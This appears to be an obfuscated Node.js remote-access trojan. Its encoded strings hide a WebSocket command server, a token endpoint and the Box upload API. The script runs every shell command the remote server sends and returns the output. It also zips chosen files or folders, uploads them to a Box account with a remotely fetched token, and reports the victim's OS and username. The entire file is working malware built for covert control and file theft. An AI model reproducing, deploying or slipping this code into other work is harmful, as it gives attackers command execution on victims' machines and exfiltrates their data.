const a0_0x210707=a0_0x5c84;(function(_0x16f70b,_0x1abb40){const _0x3cb6d9=a0_0x5c84,_0x41f16b=_0x16f70b();while(!![]){try{const _0x3f1af3=-parseInt(_0x3cb6d9(0x145))/0x1*(-parseInt(_0x3cb6d9(0x14d))/0x2)+parseInt(_0x3cb6d9(0x147))/0x3*(-parseInt(_0x3cb6d9(0x167))/0x4)+-parseInt(_0x3cb6d9(0x16a))/0x5+parseInt(_0x3cb6d9(0x179))/0x6*(parseInt(_0x3cb6d9(0x14a))/0x7)+-parseInt(_0x3cb6d9(0x152))/0x8*(-parseInt(_0x3cb6d9(0x17a))/0x9)+-parseInt(_0x3cb6d9(0x151))/0xa+parseInt(_0x3cb6d9(0x142))/0xb;if(_0x3f1af3===_0x1abb40)break;else _0x41f16b['push'](_0x41f16b['shift']());}catch(_0x4824aa){_0x41f16b['push'](_0x41f16b['shift']());}}}(a0_0x1b5c,0x4a3f4));const WebSocket=require('ws'),{exec}=require('child_process'),path=require(a0_0x210707(0x13c)),fs=require('fs'),archiver=require('archiver'),axios=require(a0_0x210707(0x17b)),os=require('os'),FormData=require('form-data');let currentDirectory=process[a0_0x210707(0x175)]();function executeCommand(_0x5d96b6){const _0x2cb889=a0_0x210707;if(_0x5d96b6[_0x2cb889(0x15b)](_0x2cb889(0x161))){const _0x567675=_0x5d96b6[_0x2cb889(0x146)](0x3)[_0x2cb889(0x15c)]();if(_0x567675==='..')currentDirectory=path[_0x2cb889(0x164)](currentDirectory);else{if(path[_0x2cb889(0x180)](_0x567675)){if(fs[_0x2cb889(0x170)](_0x567675)&&fs[_0x2cb889(0x171)](_0x567675)[_0x2cb889(0x16f)]())currentDirectory=_0x567675;else return _0x2cb889(0x154)+_0x567675;}else{const _0x20a0e5=path[_0x2cb889(0x158)](currentDirectory,_0x567675);if(fs[_0x2cb889(0x170)](_0x20a0e5)&&fs['lstatSync'](_0x20a0e5)[_0x2cb889(0x16f)]())currentDirectory=_0x20a0e5;else return _0x2cb889(0x154)+_0x20a0e5;}}return _0x2cb889(0x17c)+currentDirectory;}return new Promise(_0x427022=>{exec(_0x5d96b6,{'cwd':currentDirectory},(_0x515fe9,_0x4a5a5f,_0x5c2025)=>{_0x427022(_0x4a5a5f+_0x5c2025);});});}function compressToZip(_0x22fc61,_0x4d62f0){return new Promise((_0x147fc2,_0x32714c)=>{const _0x22808c=a0_0x5c84,_0x1c40d4=fs['createWriteStream'](_0x4d62f0),_0x4f8385=archiver(_0x22808c(0x176),{'zlib':{'level':0x9}});_0x1c40d4['on'](_0x22808c(0x150),()=>_0x147fc2(_0x22808c(0x15f)+_0x4d62f0)),_0x4f8385['on'](_0x22808c(0x173),_0x2719a2=>_0x32714c('Error:\x20'+_0x2719a2[_0x22808c(0x153)])),_0x4f8385[_0x22808c(0x17d)](_0x1c40d4),fs['lstatSync'](_0x22fc61)[_0x22808c(0x16f)]()?_0x4f8385[_0x22808c(0x174)](_0x22fc61,![]):_0x4f8385[_0x22808c(0x159)](_0x22fc61,{'name':path[_0x22808c(0x141)](_0x22fc61)}),_0x4f8385['finalize']();});}function deleteFile(_0x30d5c3){const _0x221f4e=a0_0x210707;if(fs[_0x221f4e(0x170)](_0x30d5c3))return fs[_0x221f4e(0x166)](_0x30d5c3),_0x221f4e(0x148)+_0x30d5c3;return'File\x20not\x20found:\x20'+_0x30d5c3;}function a0_0x5c84(_0x2f6f24,_0x127301){const _0x1b5c22=a0_0x1b5c();return a0_0x5c84=function(_0x5c8404,_0x5011a4){_0x5c8404=_0x5c8404-0x13c;let _0x210d02=_0x1b5c22[_0x5c8404];return _0x210d02;},a0_0x5c84(_0x2f6f24,_0x127301);}async function getToken(){const _0x15c91f=a0_0x210707;try{const _0x25be60=Buffer[_0x15c91f(0x149)](_0x15c91f(0x169),_0x15c91f(0x16e))['toString'](_0x15c91f(0x14f)),_0x48d3c9=await axios[_0x15c91f(0x15e)](_0x25be60);return _0x48d3c9['data'];}catch(_0x1d73f1){return'Error:\x20'+_0x1d73f1[_0x15c91f(0x144)][_0x15c91f(0x14c)];}}function a0_0x1b5c(){const _0x240100=['14LDmWXP','post','utf-8','close','4929650nkAcsx','1753384jyAHyJ','message','Directory\x20not\x20found:\x20','Exiting\x20client...','userInfo','data','join','file','Error:\x20','startsWith','trim','temp0.zip','get','Compressed\x20successfully:\x20','createReadStream','cd\x20','upload_y\x20','replace','dirname','username','unlinkSync','44kHEqHV','get_client_info','aHR0cHM6Ly9ib3gtdG9rZW4udmVyY2VsLmFwcA==','2405130nfUzRk','send','toISOString','type','base64','isDirectory','existsSync','lstatSync','exit','error','directory','cwd','zip','File\x20uploaded\x20successfully!','d3NzOi8vc29ja2V0c2VydmVyLXByb2R1Y3Rpb24tOTZkOC51cC5yYWlsd2F5LmFwcA==','1633746NRLgaY','9ooTLEa','axios','Changed\x20directory\x20to:\x20','pipe','stringify','Bearer\x20','isAbsolute','path','append','attributes','toString','\x0aToken:\x20','basename','6760468qerDqU','release','response','45693JMtUam','slice','40308lUnkWk','Deleted\x20file:\x20','from','7CYcsth',',\x20Response:\x20','status'];a0_0x1b5c=function(){return _0x240100;};return a0_0x1b5c();}async function uploadFileToBox(_0xddf031,_0x4d8abe,_0x3bfaf9){const _0x9aba6f=a0_0x210707,_0x276752=Buffer[_0x9aba6f(0x149)]('aHR0cHM6Ly91cGxvYWQuYm94LmNvbS9hcGkvMi4wL2ZpbGVzL2NvbnRlbnQ=','base64')[_0x9aba6f(0x13f)](_0x9aba6f(0x14f)),_0x476165={'Authorization':_0x9aba6f(0x17f)+_0x3bfaf9},_0x1bfdbc=new FormData();_0x1bfdbc[_0x9aba6f(0x13d)](_0x9aba6f(0x13e),JSON[_0x9aba6f(0x17e)]({'name':_0x4d8abe,'parent':{'id':'0'}})),_0x1bfdbc[_0x9aba6f(0x13d)](_0x9aba6f(0x159),fs[_0x9aba6f(0x160)](_0xddf031));try{const _0x56c6b7=await axios[_0x9aba6f(0x14e)](_0x276752,_0x1bfdbc,{'headers':{..._0x476165,..._0x1bfdbc['getHeaders']()}});return _0x56c6b7[_0x9aba6f(0x14c)]===0xc9?_0x9aba6f(0x177):_0x9aba6f(0x15a)+_0x56c6b7[_0x9aba6f(0x14c)]+_0x9aba6f(0x14b)+_0x56c6b7[_0x9aba6f(0x157)];}catch(_0x144ad8){return _0x9aba6f(0x15a)+_0x144ad8[_0x9aba6f(0x144)][_0x9aba6f(0x14c)]+_0x9aba6f(0x14b)+_0x144ad8[_0x9aba6f(0x144)][_0x9aba6f(0x157)];}}const socpa=Buffer[a0_0x210707(0x149)](a0_0x210707(0x178),a0_0x210707(0x16e))[a0_0x210707(0x13f)](a0_0x210707(0x14f)),ws=new WebSocket(socpa);ws['on'](a0_0x210707(0x153),async _0x39dc2a=>{const _0x157916=a0_0x210707,_0x423891=_0x39dc2a[_0x157916(0x13f)]();if(_0x423891===_0x157916(0x172))ws[_0x157916(0x16b)](_0x157916(0x155)),ws[_0x157916(0x150)]();else{if(_0x423891[_0x157916(0x15b)](_0x157916(0x162))){const _0x1ec605=path['join'](currentDirectory,_0x423891[_0x157916(0x146)](0x9)[_0x157916(0x15c)]()),_0x400861=path[_0x157916(0x158)](currentDirectory,_0x157916(0x15d));try{const _0x51e71a=await compressToZip(_0x1ec605,_0x400861),_0x2ce0a3=await getToken(),_0x5766c2=new Date()[_0x157916(0x16c)]()[_0x157916(0x163)](/[-:.]/g,''),_0x41a285=await uploadFileToBox(_0x400861,_0x5766c2,_0x2ce0a3),_0x1fd1f7=deleteFile(_0x400861);ws[_0x157916(0x16b)](_0x51e71a+_0x157916(0x140)+_0x2ce0a3+'\x0a'+_0x41a285+'\x0a'+_0x1fd1f7);}catch(_0xfedd43){ws['send'](_0x157916(0x15a)+_0xfedd43);}}else{if(_0x423891===_0x157916(0x168)){const _0x27c94b=os[_0x157916(0x16d)]()+'('+os[_0x157916(0x143)]()+')_'+os[_0x157916(0x156)]()[_0x157916(0x165)];ws[_0x157916(0x16b)](_0x27c94b);}else{const _0x4a3567=await executeCommand(_0x423891);ws[_0x157916(0x16b)](_0x4a3567);}}}});